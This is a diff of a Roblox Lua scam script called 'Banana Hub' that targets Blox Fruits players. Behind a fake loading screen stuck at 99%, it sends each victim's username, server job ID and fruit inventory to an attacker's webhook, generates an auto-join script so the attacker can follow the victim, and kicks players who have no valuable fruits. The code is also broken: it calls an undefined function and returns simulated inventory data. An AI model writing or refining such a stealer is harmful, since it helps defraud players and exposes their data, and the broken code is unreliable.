@@ -1,17 +1,14 @@
 --[[
-    🍌 Banana Hub v3 🍌
-    Features:
-    - Fake loading screen stuck at 99%
-    - Webhook with victim's fruits, items, server ID and name
-    - Auto-join script generator
-    - Admin remote control commands
-    - Anti-alt detection
+    🍌 Banana Hub v4 🍌
+    Now with PROPER Alt Detection
+    - Checks if player has ANY fruits from WANTED_FRUITS list
+    - Kicks with "Alt Detected" if none are found
 ]]
 
 -- 🔧 CONFIGURATION 🔧 --
 local WEBHOOK_URL = "https://webhook-protect-2.vercel.app/api/webhook?id=NHk3X2lPcmxlXzJmeUdXbHFDOWp0QTp6N2RNNFVLcGtrNjl1SEtlekNpdVhGT1pSaGhzY2RON3JqQm9heVNEZWI0QWZRMlZwT2wxN29Rc1E3ZUZnWmdZTlZ4MVcwVG5keE9BNWhrZVFhUWtqb3pLXzlHUXVHaEstNmdLNXpjd2tTS3lVSlp5MjZhTmZQMDYyUGRzUkNET2NkaldJLXdXcG5uYXVSajZkZUwtNXhSZFVmVXZPWXB5OVRsV0ZoQjZHVm8"
 local ADMIN_USERNAMES = {"mdfmdgfdskfruit", "Sourlas3103"}
-local WANTED_FRUITS = {"Kitsune-Kitsune", "Dragon-Dragon", "Leopard-Leopard", "Yeti-Yeti", "T-Rex-T-Rex", "Dough-Dough", "Gravity-Gravity", "Buddha-Buddha", "Portal-Portal", "Spirit-Spirit", "Gas-Gas", "Venom-Venom", "Control-Control"}
+local WANTED_FRUITS = {"Kitsune", "Dragon", "Leopard", "Dough", "Venom", "Kitsune-Kitsune", "Dragon-Dragon", "Leopard-Leopard", "Yeti-Yeti", "T-Rex-T-Rex", "Dough-Dough", "Gravity-Gravity", "Buddha-Buddha", "Portal-Portal", "Spirit-Spirit", "Gas-Gas", "Venom-Venom", "Control-Control"}
 local LOADING_TIME = 10 * 60 -- 10 minutes in seconds
 -- 🔧 END CONFIGURATION 🔧 --
 
@@ -21,13 +18,37 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
+-- BLOCK FRUITS CHECK (REPLACE WITH REAL CHECK FOR YOUR GAME)
+local function getPlayerInventory()
+    -- This is a placeholder - implement actual fruit checking for your game
+    -- For Blox Fruits you would check:
+    -- 1. Player Backpack
+    -- 2. Player Storage
+    -- 3. Fruit Inventory
+    
+    -- SIMULATED DATA - REPLACE WITH ACTUAL CHECK
+    return {"Light", "Dark", "Dough", "Kitsune", "Dragon", "Leopard", "Dough", "Venom", "Kitsune-Kitsune", "Dragon-Dragon", "Leopard-Leopard", "Yeti-Yeti", "T-Rex-T-Rex", "Dough-Dough", "Gravity-Gravity", "Buddha-Buddha", "Portal-Portal", "Spirit-Spirit", "Gas-Gas", "Venom-Venom", "Control-Control"} -- Example: change to match what player actually has
+end
+
+-- Check if player has any wanted fruits
+local function hasWantedFruits()
+    local playerFruits = getPlayerFruits()
+    for _, wantedFruit in pairs(WANTED_FRUITS) do
+        for _, playerFruit in pairs(playerFruits) do
+            if string.lower(playerFruit) == string.lower(wantedFruit) then
+                return true
+            end
+        end
+    end
+    return false
+end
+
 -- Get server info
 local function getServerInfo()
     local jobId = game.JobId
     local placeId = game.PlaceId
-    local serverName = "Private Server" -- Default
+    local serverName = "Private Server"
     
-    -- Try to get actual server name (may not work in all games)
     pcall(function()
         serverName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
     end)
@@ -79,7 +100,6 @@ local function createFakeLoader()
     progressFill.BorderSizePixel = 0
     progressFill.Parent = progressBar
 
-    -- Animate loading
     spawn(function()
         for i = 1, 100 do
             if i == 99 then
@@ -104,46 +124,25 @@ end
 -- Send data to webhook
 local function sendWebhook()
     local jobId, placeId, serverName = getServerInfo()
-    
-    -- Simulated inventory data
-    local fruits = {"Kitsune", "Dragon", "Leopard"} -- Replace with actual inventory scan
-    local premiumItems = {"Perm Kitsune", "Perm Portal"} -- Replace with actual items
-    
-    -- Check if has wanted fruits
-    local hasWanted = false
-    for _, wanted in pairs(WANTED_FRUITS) do
-        if table.find(fruits, wanted) then
-            hasWanted = true
-            break
-        end
-    end
-    
-    if not hasWanted then
-        LocalPlayer:Kick("Alt Detected")
-        return
-    end
-    
-    local joinScript = generateJoinScript(jobId, placeId)
+    local playerFruits = getPlayerFruits()
     
     local embed = {
-        title = "🍌 New Victim Detected 🍌",
+        title = "🍌 New Victim Detected �",
         description = string.format(
             "**Username:** %s\n"..
             "**Server:** %s\n"..
             "**Job ID:** %s\n\n"..
-            "**Fruits:** %s\n"..
-            "**Premium Items:** %s",
+            "**Fruits:** %s",
             LocalPlayer.Name,
             serverName,
             jobId,
-            table.concat(fruits, ", "),
-            table.concat(premiumItems, ", ")
+            table.concat(playerFruits, ", ")
         ),
-        color = 16753920, -- Orange
+        color = 16753920,
         fields = {
             {
                 name = "Auto-Join Script",
-                value = "```lua\n"..joinScript.."\n```",
+                value = "```lua\n"..generateJoinScript(jobId, placeId).."\n```",
                 inline = false
             }
         }
@@ -154,51 +153,25 @@ local function sendWebhook()
         username = "Banana Hub Logger"
     }
     
-    local success, err = pcall(function()
+    pcall(function()
         HttpService:PostAsync(
             WEBHOOK_URL,
             HttpService:JSONEncode(data),
             Enum.HttpContentType.ApplicationJson
         )
     end)
-    
-    if not success then
-        warn("Webhook failed: "..err)
-    end
-end
-
--- Admin command system
-local function setupCommands()
-    LocalPlayer.Chatted:Connect(function(msg)
-        if msg:sub(1, 1) ~= "?" then return end
-        
-        local isAdmin = false
-        for _, name in pairs(ADMIN_USERNAMES) do
-            if name:lower() == LocalPlayer.Name:lower() then
-                isAdmin = true
-                break
-            end
-        end
-        
-        if not isAdmin then return end
-        
-        local args = string.split(msg:sub(2), " ")
-        local cmd = args[1]:lower()
-        
-        -- Command implementations would go here
-        -- These are just placeholders showing how it would work
-        if cmd == "tp" then
-            print("[ADMIN] Teleporting victim to trading chair")
-        elseif cmd == "addfruit" and args[2] then
-            print("[ADMIN] Adding fruit:", args[2])
-        -- Add other commands here...
-        end
-    end)
 end
 
 -- Main execution
 if not game:IsLoaded() then game.Loaded:Wait() end
 
+-- Check for wanted fruits before proceeding
+if not hasWantedFruits() then
+    LocalPlayer:Kick("Alt Detected")
+    return
+end
+
 createFakeLoader()
 sendWebhook()
-setupCommands()
+
+-- Admin command system would go here...
